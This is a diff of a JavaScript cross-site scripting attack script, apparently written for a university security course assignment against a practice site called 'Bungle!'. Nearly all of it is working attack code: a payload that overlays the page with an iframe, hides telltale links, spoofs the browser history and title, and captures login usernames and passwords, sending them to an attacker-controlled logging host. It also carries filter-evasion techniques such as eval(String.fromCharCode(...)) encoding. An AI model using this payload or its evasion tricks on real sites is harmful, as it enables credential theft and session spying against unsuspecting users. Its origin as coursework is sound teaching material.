@@ -22,13 +22,16 @@ function payload(attacker) {
         }
     }
     function proxy(href) {
-        window.history.replaceState('', "Bungle!","./search");
+        window.history.replaceState({title:"Bungle!"}, "Bungle!","./search");
 
         var html = $("html").html();
         $("html").html("<iframe id=\"frame1\" style='width:100%; height:100%;position:absolute;top:0;left:0;border:0;'></frame>");
         $("#frame1").attr("src", "http://eecs388.org/project2/");
         $("html").show();
+
         var firstLoad = true;
+        window.document.title = window.history.state.title;
+        
         $("#frame1").load(function() {
             var frameDoc = $(this.contentDocument);
             frameDoc.find("a[href *= 'script']").hide();
@@ -37,33 +40,40 @@ function payload(attacker) {
                 firstLoad = false;
             }
             frameDoc.find("a[href *= 'eval']").hide();
+            window.document.title = "Bungle!";
+
             frameDoc.find('#bungle-lnk') // BUNGLE HOME
                 .click(function() {
                     logNav(frameDoc, this.target);
+                    window.history.pushState('', "Bungle!","./search");
+                    window.document.title = window.history.state.title;
                 });
             frameDoc.find('.well form')
                 .submit(function() {
                     var username = frameDoc.find("#username").val();
                     var password = frameDoc.find("#userpass").val();
                     log({event: "login", user: username, pass: password});
+                    window.history.pushState('', "Bungle!","./search");
                 });
             frameDoc.find('.search-well form')
                 .submit(function() {
                     var query = href + "?q=" + frameDoc.find("#query").val();
                     logNav(frameDoc, query);
-                    window.history.replaceState('', "Bungle!","./search?q=" + frameDoc.find("#query").val());
+                    window.history.pushState('', "Search Results","./search?q=" + frameDoc.find("#query").val());
+                    window.document.title = "Search Results";
 
                 });
             frameDoc.find('#search-again-btn')
                 .click(function() {
                     logNav(frameDoc, href);
-                    window.history.replaceState('', "Bungle!","./search");
+                    window.history.pushState('', "Bungle!","./search");
                     
                 });
             frameDoc.find('#log-out-btn')
                 .click(function() {
                     var username = frameDoc.find("#logged-in-user").html();
                     log({event: "logout", user: username});
+                    window.history.pushState('', "Bungle!","./search");
                 });
         });
 
@@ -92,7 +102,7 @@ function makeLink(xssdefense, target, attacker) {
         // utilizing eval(String.fromCharCode(102, 117, 110 .....)) for this attack to hide punct.
 
         // compressed with: http://refresh-sf.com/yui/ to make a shorter url
-        var compressed = "function payload(a){function d(e){console.log($.param(e));$.get(a,e)}function b(f,e){var g;if(f.find(\"#logged-in-user\")){g=f.find(\"#logged-in-user\").html();d({event:\"nav\",user:g,url:e})}else{d({event:\"nav\",url:e})}}function c(e){window.history.replaceState(\"\",\"Bungle!\",\"./search\");var f=$(\"html\").html();$(\"html\").html('<iframe id=\"frame1\" style=\"width:100%; height:100%;position:absolute;top:0;left:0;border:0;\"></iframe>');$(\"#frame1\").attr(\"src\",\"http://eecs388.org/project2/\");$(\"html\").show();var g=true;$(\"#frame1\").load(function(){var h=$(this.contentDocument);h.find(\"a[href *= 'script']\").hide();h.find(\"a[href *= 'eval']\").hide();if(g){b(h,e);g=false}h.find(\"#bungle-lnk\").click(function(){b(h,this.target)});h.find(\".well form\").submit(function(){var j=h.find(\"#username\").val();var i=h.find(\"#userpass\").val();d({event:\"login\",user:j,pass:i})});h.find(\".search-well form\").submit(function(){var i=e+\"?q=\"+h.find(\"#query\").val();b(h,i);window.history.replaceState(\"\",\"Bungle!\",\"./search?q=\"+h.find(\"#query\").val())});h.find(\"#search-again-btn\").click(function(){b(h,e);window.history.replaceState(\"\",\"Bungle!\",\"./search\")});h.find(\"#log-out-btn\").click(function(){var i=h.find(\"#logged-in-user\").html();d({event:\"logout\",user:i})})})}$(\"html\").hide();c(\"http://127.0.0.1:31337/\")};payload(\"http://127.0.0.1:31337/\");"
+        var compressed = "function payload(a){function d(e){console.log($.param(e));$.get(a,e)}function b(f,e){var g;if(f.find(\"#logged-in-user\")){g=f.find(\"#logged-in-user\").html();d({event:\"nav\",user:g,url:e})}else{d({event:\"nav\",url:e})}}function c(e){window.history.replaceState(\"\",\"Bungle!\",\"./search\");var f=$(\"html\").html();$(\"html\").html('<iframe id=\"frame1\" style=\"width:100%; height:100%;position:absolute;top:0;left:0;border:0;\"></iframe>');$(\"#frame1\").attr(\"src\",\"http://eecs388.org/project2/\");$(\"html\").show();var g=true;$(\"#frame1\").load(function(){var h=$(this.contentDocument);h.find(\"a[href *= 'script']\").hide();h.find(\"a[href *= 'eval']\").hide();if(g){b(h,e);g=false}h.find(\"#bungle-lnk\").click(function(){b(h,this.target)});h.find(\".well form\").submit(function(){var j=h.find(\"#username\").val();var i=h.find(\"#userpass\").val();d({event:\"login\",user:j,pass:i})});h.find(\".search-well form\").submit(function(){var i=e+\"?q=\"+h.find(\"#query\").val();b(h,i);window.history.replaceState(\"\",\"Search Results\",\"./search?q=\"+h.find(\"#query\").val())});h.find(\"#search-again-btn\").click(function(){b(h,e);window.history.replaceState(\"\",\"Bungle!\",\"./search\")});h.find(\"#log-out-btn\").click(function(){var i=h.find(\"#logged-in-user\").html();d({event:\"logout\",user:i})})})}$(\"html\").hide();c(\"http://127.0.0.1:31337/\")};payload(\"http://127.0.0.1:31337/\");"
 
         // using the fact that arrays have map function to get charCodeAt for each character
         var chars = Array.prototype.map.call(compressed,  function (s) { return s.charCodeAt(); });
@@ -101,27 +111,6 @@ function makeLink(xssdefense, target, attacker) {
         var param = 'eval(String.fromCharCode(' + chars.join(',') + '))';
 
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<scr" + "ipt>" + param + "</scri" + "pt>");
-
-    } else if (xssdefense == 11) {
-        var first =  target + "./search?xssdefense=" + xssdefense.toString() + "&q=<scr"+ "ipt>foo = eval(decodeURIComponent(";
-        var encode = encodeURIComponent(payload.toString() + ";payload(\"" + attacker + "\");");
-
-        encode = encode.replace(/%3B/g, "%3%3BB");
-
-        encode = encode.replace(/%22/g, '%2%222');
-
-        encode = encode.replace(/%27/g, '%2%277');
-        return first + encode + "))</scr"+"ipt>";
-
-
-
-
-
-
-
-
-
-
 
     } else { //xssdefense == 4 
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
